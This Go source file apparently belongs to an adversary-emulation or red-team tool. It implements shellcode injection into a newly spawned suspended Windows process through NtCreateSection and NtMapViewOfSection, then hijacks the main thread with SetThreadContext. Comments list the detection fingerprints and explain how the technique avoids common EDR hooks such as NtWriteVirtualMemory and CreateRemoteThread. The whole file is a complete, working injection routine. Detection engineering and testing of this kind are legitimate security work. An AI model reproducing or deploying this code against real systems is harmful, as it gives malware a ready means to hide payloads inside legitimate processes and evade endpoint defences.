//go:build windows

package technique

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows constants not exported by golang.org/x/sys/windows
const (
	SECTION_ALL_ACCESS       = 0x000F001F
	SEC_COMMIT               = 0x08000000
	PAGE_EXECUTE_READWRITE   = 0x40
	PAGE_EXECUTE_READ        = 0x20
	MEM_COMMIT               = 0x00001000
	MEM_RESERVE              = 0x00002000
	CONTEXT_AMD64            = 0x00100000
	CONTEXT_CONTROL          = CONTEXT_AMD64 | 0x00000001
	CONTEXT_INTEGER          = CONTEXT_AMD64 | 0x00000002
	CONTEXT_FULL             = CONTEXT_CONTROL | CONTEXT_INTEGER | 0x00000010
	THREAD_ALL_ACCESS        = 0x001FFFFF
	PROCESS_ALL_ACCESS       = 0x001FFFFF
	VIEW_SHARE               = 1
)

var (
	ntdll                    = windows.NewLazySystemDLL("ntdll.dll")
	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
	procNtMapViewOfSection   = ntdll.NewProc("NtMapViewOfSection")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
	procNtClose              = ntdll.NewProc("NtClose")
)

// SectionInject injects shellcode into a freshly spawned suspended process
// using the NtCreateSection + NtMapViewOfSection technique.
//
// Detection fingerprint:
//   - Anonymous RWX section backed by pagefile (no file path in VAD)
//   - ETW KERNEL_THREATINT_KEYWORD_MAPVIEW fires on NtMapViewOfSection into foreign process
//   - Sysmon Event 25: ProcessTampering when remote mapping is executable
//   - Thread entry point outside any loaded PE image (Sysmon Event 8 if using CreateRemoteThread)
func SectionInject(targetExe string, shellcode []byte) error {
	fmt.Printf("  [technique] NtMapViewOfSection\n")
	fmt.Printf("  [target]    %s\n", targetExe)
	fmt.Printf("  [payload]   %d bytes\n", len(shellcode))

	// --- Step 1: Spawn target process suspended ---
	targetPath, err := resolveExecutable(targetExe)
	if err != nil {
		return fmt.Errorf("resolve target: %w", err)
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	targetPathPtr, _ := windows.UTF16PtrFromString(targetPath)
	err = windows.CreateProcess(
		nil,
		targetPathPtr,
		nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil,
		&si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", targetPath, err)
	}
	fmt.Printf("  [spawned]   PID %d TID %d (suspended)\n", pi.ProcessId, pi.ThreadId)

	defer func() {
		// Cleanup handles regardless of outcome
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	// --- Step 2: NtCreateSection — anonymous, pagefile-backed, RWX ---
	// This is the key evasion: no cross-process write call, so no NtWriteVirtualMemory hook.
	// The section is accessible from both processes via separate mappings.
	var sectionHandle windows.Handle
	shellcodeSize := uintptr(len(shellcode))
	var maxSize int64 = int64(shellcodeSize)

	ntstatus, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,                                       // NULL ObjectAttributes (anonymous)
		uintptr(unsafe.Pointer(&maxSize)),       // MaximumSize
		PAGE_EXECUTE_READWRITE,                  // SectionPageProtection
		SEC_COMMIT,                              // AllocationAttributes (pagefile-backed)
		0,                                       // NULL FileHandle
	)
	if ntstatus != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("NtCreateSection: NTSTATUS 0x%x", ntstatus)
	}
	fmt.Printf("  [section]   handle 0x%x\n", sectionHandle)

	defer procNtClose.Call(uintptr(sectionHandle))

	// --- Step 3: NtMapViewOfSection into current process (local mapping) ---
	// After this, we have a pointer we can write to directly (no WriteProcessMemory).
	var localAddr uintptr
	localViewSize := shellcodeSize

	ntstatus, _, _ = procNtMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(windows.CurrentProcess()),       // -1 = current process pseudo-handle
		uintptr(unsafe.Pointer(&localAddr)),
		0,                                       // ZeroBits
		0,                                       // CommitSize (let the OS handle it)
		0,                                       // SectionOffset (NULL = 0)
		uintptr(unsafe.Pointer(&localViewSize)),
		VIEW_SHARE,                              // InheritDisposition
		0,                                       // AllocationType
		PAGE_EXECUTE_READWRITE,
	)
	if ntstatus != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("NtMapViewOfSection (local): NTSTATUS 0x%x", ntstatus)
	}
	fmt.Printf("  [local map] 0x%x (RWX, %d bytes)\n", localAddr, localViewSize)

	// --- Step 4: Copy shellcode into local mapping ---
	// memcpy — direct slice write, no kernel involvement.
	dst := (*[1 << 30]byte)(unsafe.Pointer(localAddr))[:shellcodeSize:shellcodeSize]
	copy(dst, shellcode)
	fmt.Printf("  [copied]    shellcode written to local mapping\n")

	// --- Step 5: NtMapViewOfSection into target process (remote mapping) ---
	// This is the EDR trigger: NtMapViewOfSection with a remote process handle.
	// ETW KERNEL_THREATINT_KEYWORD_MAPVIEW fires here.
	// The remote mapping is RX only — no writable remote memory ever existed.
	var remoteAddr uintptr
	remoteViewSize := shellcodeSize

	ntstatus, _, _ = procNtMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&remoteAddr)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&remoteViewSize)),
		VIEW_SHARE,
		0,
		PAGE_EXECUTE_READ, // RX only in target process
	)
	if ntstatus != 0 {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("NtMapViewOfSection (remote): NTSTATUS 0x%x", ntstatus)
	}
	fmt.Printf("  [remote map] 0x%x (RX, PID %d)\n", remoteAddr, pi.ProcessId)

	// --- Step 6: Redirect thread to shellcode via SetThreadContext ---
	// Modify RIP of the suspended main thread to point to our remote mapping.
	// This avoids CreateRemoteThread (Sysmon Event 8) at the cost of corrupting
	// the target process's normal startup — this is the "hollow" behavior.
	ctx, err := getThreadContext(pi.Thread)
	if err != nil {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("GetThreadContext: %w", err)
	}

	ctx.Rip = uint64(remoteAddr)
	if err := setThreadContext(pi.Thread, ctx); err != nil {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), remoteAddr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("SetThreadContext: %w", err)
	}
	fmt.Printf("  [ctx]       RIP → 0x%x\n", remoteAddr)

	// Unmap local view (no longer needed after copy)
	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)

	// --- Step 7: Resume thread ---
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   PID %d executing at 0x%x\n", pi.ProcessId, remoteAddr)

	return nil
}
